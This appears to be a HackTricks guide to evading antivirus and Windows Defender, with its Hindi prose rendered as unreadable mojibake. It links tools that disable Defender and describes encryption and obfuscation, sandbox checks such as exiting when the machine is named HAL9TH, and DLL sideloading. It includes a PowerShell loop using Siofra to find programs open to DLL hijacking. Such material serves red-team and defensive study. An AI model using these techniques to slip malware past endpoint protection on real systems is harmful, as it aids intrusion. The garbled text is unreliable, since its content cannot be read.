# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**рдпрд╣ рдкреГрд╖реНрда рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдгред
- [no-defender](https://github.com/es3n1n/no-defender): Windows Defender рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдг рдЬреЛ рджреВрд╕рд░реЗ AV рдХрд╛ рдирд╛рдЯрдХ рдХрд░рддрд╛ рд╣реИред
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

рд╡рд░реНрддрдорд╛рди рдореЗрдВ, AV рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╣реИ рдпрд╛ рдирд╣реАрдВ, рд╕реНрдереИрддрд┐рдХ рдкрд╣рдЪрд╛рди, рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг, рдФрд░ рдЕрдзрд┐рдХ рдЙрдиреНрдирдд EDRs рдХреЗ рд▓рд┐рдП, рд╡реНрдпрд╡рд╣рд╛рд░рд╛рддреНрдордХ рд╡рд┐рд╢реНрд▓реЗрд╖рдгред

### **Static detection**

рд╕реНрдереИрддрд┐рдХ рдкрд╣рдЪрд╛рди рдЬреНрдЮрд╛рдд рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдпрд╛ рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рдПрд░реЗ рдХреЛ рдПрдХ рдмрд╛рдЗрдирд░реА рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдлреНрд▓реИрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рд╣реИ, рдФрд░ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП (рдЬреИрд╕реЗ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд╡рд░рдг, рдХрдВрдкрдиреА рдХрд╛ рдирд╛рдо, рдбрд┐рдЬрд┐рдЯрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░, рдЖрдЗрдХрди, рдЪреЗрдХрд╕рдо, рдЖрджрд┐)ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬреНрдЮрд╛рдд рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдЖрдкрдХреЛ рдЕрдзрд┐рдХ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЗрдВ рд╢рд╛рдпрдж рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЗ рд░реВрдк рдореЗрдВ рдлреНрд▓реИрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдкрд╣рдЪрд╛рди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

- **Encryption**

рдпрджрд┐ рдЖрдк рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AV рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ рд▓реЛрдбрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

- **Obfuscation**

рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдмрд╛рдЗрдирд░реА рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдХреБрдЫ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдпрд╣ AV рдХреЛ рдкрд╛рд░ рдХрд░ рд╕рдХреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рдЙрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдХреНрдпрд╛ рдУрдмрдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдпрд╣ рдПрдХ рд╕рдордп рд▓реЗрдиреЗ рд╡рд╛рд▓рд╛ рдХрд╛рд░реНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

- **Custom tooling**

рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдЙрдкрдХрд░рдг рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЛрдИ рдЬреНрдЮрд╛рдд рдмреБрд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рдордп рдФрд░ рдкреНрд░рдпрд╛рд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

> [!TIP]
> Windows Defender рдХреА рд╕реНрдереИрддрд┐рдХ рдкрд╣рдЪрд╛рди рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдВрдЪрдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)ред рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрдИ рдЦрдВрдбреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ Defender рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рд╡реНрдпрдХреНрддрд┐рдЧрдд рд░реВрдк рд╕реЗ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИ, рдЗрд╕ рддрд░рд╣, рдпрд╣ рдЖрдкрдХреЛ рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдХреМрди рд╕реА рдлреНрд▓реИрдЧ рдХреА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдпрд╛ рдмрд╛рдЗрдЯреНрд╕ рд╣реИрдВред

рдореИрдВ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрд╢рдВрд╕рд╛ рдХрд░рддрд╛ рд╣реВрдБ рдХрд┐ рдЖрдк рдЗрд╕ [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) рдХреЛ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ AV Evasion рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рджреЗрдЦреЗрдВред

### **Dynamic analysis**

рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм AV рдЖрдкрдХреЗ рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рдЪрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдЖрдкрдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛, LSASS рдкрд░ рдорд┐рдиреАрдбрдВрдк рдХрд░рдирд╛, рдЖрджрд┐)ред рдЗрд╕ рднрд╛рдЧ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдирд╛ рдереЛрдбрд╝рд╛ рдХрдард┐рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣рд╛рдБ рдХреБрдЫ рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬреЛ рдЖрдк рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

- **Sleep before execution** рдЗрд╕реЗ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдпрд╣ AV рдХреЗ рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╢рд╛рдирджрд╛рд░ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред AV рдХреЗ рдкрд╛рд╕ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдХрдо рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдореЗрдВ рдмрд╛рдзрд╛ рди рдЖрдП, рдЗрд╕рд▓рд┐рдП рд▓рдВрдмреЗ рд╕реНрд▓реАрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд╛рдЗрдирд░реА рдХреЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдХрдИ AV рдХреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реНрд▓реАрдк рдХреЛ рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рдЗрд╕ рдмрд╛рдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- **Checking machine's resources** рдЖрдорддреМрд░ рдкрд░ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдкрд╛рд╕ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдХрдо рд╕рдВрд╕рд╛рдзрди рд╣реЛрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ < 2GB RAM), рдЕрдиреНрдпрдерд╛ рд╡реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдорд╢реАрди рдХреЛ рдзреАрдорд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣рд╛рдБ рдмрд╣реБрдд рд░рдЪрдирд╛рддреНрдордХ рднреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CPU рдХреЗ рддрд╛рдкрдорд╛рди рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдлреИрди рд╕реНрдкреАрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ, рд╕рдм рдХреБрдЫ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред
- **Machine-specific checks** рдпрджрд┐ рдЖрдк рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреА рдХрд╛рд░реНрдпрд╕реНрдерд▓ "contoso.local" рдбреЛрдореЗрди рд╕реЗ рдЬреБрдбрд╝реА рд╣реИ, рддреЛ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ рдбреЛрдореЗрди рдкрд░ рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЙрд╕ рдбреЛрдореЗрди рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдкрдиреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рд╣реИ, рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЖрдк рдЕрдкрдиреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рд╣реИ рдХрд┐ Microsoft Defender рдХрд╛ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдо HAL9TH рд╣реИ, рдЗрд╕рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ рдореИрд▓рд╡реЗрдпрд░ рдореЗрдВ рд╡рд┐рд╕реНрдлреЛрдЯ рд╕реЗ рдкрд╣рд▓реЗ рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдо рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рдирд╛рдо HAL9TH рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк Defender рдХреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВред

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) рд╕реЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЕрдиреНрдп рдмрд╣реБрдд рдЕрдЪреНрдЫреЗ рдЯрд┐рдкреНрд╕

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev рдЪреИрдирд▓</p></figcaption></figure>

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдкрд╣рд▓реЗ рдХрд╣рд╛, **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЙрдкрдХрд░рдг** рдЕрдВрддрддрдГ **рдкрдХрдбрд╝реЗ рдЬрд╛рдПрдВрдЧреЗ**, рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдЖрдк рд╕реЗ рдХреБрдЫ рдкреВрдЫрдирд╛ рдЪрд╛рд╣рд┐рдП:

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк LSASS рдХреЛ рдбрдВрдк рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, **рдХреНрдпрд╛ рдЖрдкрдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ mimikatz рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк рдПрдХ рдЕрд▓рдЧ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрдо рдЬреНрдЮрд╛рдд рд╣реИ рдФрд░ LSASS рдХреЛ рднреА рдбрдВрдк рдХрд░рддрд╛ рд╣реИред

рд╕рд╣реА рдЙрддреНрддрд░ рд╢рд╛рдпрдж рдмрд╛рдж рд╡рд╛рд▓рд╛ рд╣реИред mimikatz рдХреЛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЗрддреЗ рд╣реБрдП, рдпрд╣ рд╢рд╛рдпрдж AVs рдФрд░ EDRs рджреНрд╡рд╛рд░рд╛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдлреНрд▓реИрдЧ рдХреА рдЧрдИ рдореИрд▓рд╡реЗрдпрд░ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ, рдЬрдмрдХрд┐ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реНрд╡рдпрдВ рд╕реБрдкрд░ рдХреВрд▓ рд╣реИ, рдЗрд╕рдХреЗ рд╕рд╛рде AVs рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рдирд╛ рдПрдХ рдмреБрд░рд╛ рд╕рдкрдирд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдмрд╕ рдЖрдк рдЬреЛ рд╣рд╛рд╕рд┐рд▓ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЙрд╕рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВред

> [!TIP]
> рдЬрдм рдЖрдк рдЕрдкрдиреЗ рдкреИрд▓реЛрдбреНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **рдбрд┐рдлреЗрдВрдбрд░ рдореЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдирдореВрдирд╛ рд╕рдмрдорд┐рд╢рди рдмрдВрдж рдХрд░реЗрдВ**, рдФрд░ рдХреГрдкрдпрд╛, рдЧрдВрднреАрд░рддрд╛ рд╕реЗ, **VIRUSTOTAL рдкрд░ рдЕрдкрд▓реЛрдб рди рдХрд░реЗрдВ** рдпрджрд┐ рдЖрдкрдХрд╛ рд▓рдХреНрд╖реНрдп рд▓рдВрдмреЗ рд╕рдордп рдореЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХрд╛ рдкреИрд▓реЛрдб рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ AV рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рдПрдХ VM рдкрд░ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ, рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдирдореВрдирд╛ рд╕рдмрдорд┐рд╢рди рдмрдВрдж рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, рдФрд░ рд╡рд╣рд╛рдВ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ рдЬрдм рддрдХ рдХрд┐ рдЖрдк рдкрд░рд┐рдгрд╛рдо рд╕реЗ рд╕рдВрддреБрд╖реНрдЯ рди рд╣реЛрдВред

## EXEs vs DLLs

рдЬрдм рднреА рд╕рдВрднрд╡ рд╣реЛ, рд╣рдореЗрд╢рд╛ **рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП DLLs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВ**, рдореЗрд░реЗ рдЕрдиреБрднрд╡ рдореЗрдВ, DLL рдлрд╝рд╛рдЗрд▓реЗрдВ рдЖрдорддреМрд░ рдкрд░ **рдмрд╣реБрдд рдХрдо рдкрд╣рдЪрд╛рдиреА рдЬрд╛рддреА рд╣реИрдВ** рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдкрд╣рдЪрд╛рди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рд╕рд░рд▓ рдЪрд╛рд▓ рд╣реИ (рдпрджрд┐ рдЖрдкрдХреЗ рдкреИрд▓реЛрдб рдореЗрдВ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ DLL рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ рддреЛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ)ред

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рдЗрд╕ рдЫрд╡рд┐ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, Havoc рдХрд╛ рдПрдХ DLL рдкреИрд▓реЛрдб antiscan.me рдкрд░ 4/26 рдХреА рдкрд╣рдЪрд╛рди рджрд░ рд░рдЦрддрд╛ рд╣реИ, рдЬрдмрдХрд┐ EXE рдкреИрд▓реЛрдб рдХреА рдкрд╣рдЪрд╛рди рджрд░ 7/26 рд╣реИред

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me рдкрд░ рд╕рд╛рдорд╛рдиреНрдп Havoc EXE рдкреИрд▓реЛрдб рдмрдирд╛рдо рд╕рд╛рдорд╛рдиреНрдп Havoc DLL рдХреА рддреБрд▓рдирд╛</p></figcaption></figure>

рдЕрдм рд╣рдо рдХреБрдЫ рдЪрд╛рд▓реЗрдВ рджрд┐рдЦрд╛рдПрдВрдЧреЗ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк DLL рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдзрд┐рдХ рдЫрд┐рдкреЗ рд╣реБрдП рд░рд╣ рд╕рдХреЗрдВред

## DLL Sideloading & Proxying

**DLL Sideloading** рд▓реЛрдбрд░ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА DLL рдЦреЛрдЬ рдХреНрд░рдо рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреАрдбрд╝рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреИрд▓реЛрдбреНрд╕ рдХреЛ рдПрдХ рд╕рд╛рде рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк [Siofra](https://github.com/Cybereason/siofra) рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЙрд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DLL Sideloading рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
рдпрд╣ рдХрдорд╛рдВрдб "C:\Program Files\\" рдХреЗ рдЕрдВрджрд░ DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдХреА рд╕реВрдЪреА рдФрд░ рд╡реЗ DLL рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреЛ рд╡реЗ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рдЖрдЙрдЯрдкреБрдЯ рдХрд░реЗрдЧрд╛ред

